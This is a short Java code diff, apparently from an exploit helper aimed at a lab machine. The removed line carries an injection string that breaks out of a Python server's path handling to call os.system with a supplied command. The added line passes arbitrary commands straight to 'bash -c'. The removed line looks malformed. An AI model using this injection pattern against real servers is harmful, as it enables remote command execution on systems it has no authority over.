@@ -43,7 +43,7 @@ public class App {
 	// 80"); //servidorPython.start();
 	public static void ejecutar(String cmd) {
 		 ProcessBuilder processBuilder = new ProcessBuilder();
-		 processBuilder.command("bash", "-c", "http://10.10.10.168:8080/';path='/';os.system("+"'"+cmd+"'"+");"+"'");
+		 processBuilder.command("bash", "-c", cmd);
 			
 			try {
 				Process process = processBuilder.start();			
